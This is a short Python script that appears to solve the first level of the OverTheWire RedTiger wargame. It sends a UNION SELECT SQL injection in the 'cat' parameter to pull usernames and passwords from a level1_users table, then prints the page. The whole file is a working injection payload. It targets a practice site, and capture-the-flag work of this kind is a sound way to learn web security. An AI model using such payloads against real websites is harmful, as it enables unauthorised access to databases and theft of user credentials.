import requests

url = "https://redtiger.labs.overthewire.org/level1.php"
payload = "?cat=1 union select 1,2,username, password from level1_users"

r = requests.get(url+payload)
print r.text